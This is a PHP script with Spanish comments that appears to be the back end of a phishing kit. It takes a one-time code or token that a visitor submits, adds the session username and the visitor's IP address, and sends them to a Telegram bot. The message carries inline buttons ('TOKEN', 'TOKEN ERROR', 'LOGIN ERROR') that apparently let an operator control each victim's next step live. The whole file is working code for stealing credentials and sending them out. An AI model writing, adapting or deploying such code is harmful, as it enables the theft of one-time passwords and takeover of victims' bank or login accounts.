<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo '{"success": false}';
}

$data = json_decode(file_get_contents("php://input"), true);

$usuario = $_SESSION['usuario'] ?? 'desconocido';
$codigo = trim($data['usuario'])  ?? '';

function obtenerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    else return $_SERVER['REMOTE_ADDR'];
}
$ip = obtenerIP();

require_once("settings.php");

// NUEVOS botones válidos
$keyboard = [
    "inline_keyboard" => [
        [
            ["text" => "📩 TOKEN", "callback_data" => "TOKEN|$usuario"],
            ["text" => "❌ TOKEN ERROR", "callback_data" => "TOKEN-ERROR|$usuario"]
        ],
        [
            ["text" => "⚠️ LOGIN ERROR", "callback_data" => "LOGIN-ERROR|$usuario"]
        ]
    ]
];

$mensaje = "📲 OTP del cliente => $usuario\nTOKEN => $codigo\n🌐 IP => $ip";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    "chat_id" => $chat_id,
    "text" => $mensaje,
    "reply_markup" => json_encode($keyboard)
]));

// Redirigir al cliente a espera.php
echo '{"success": true}';
exit;
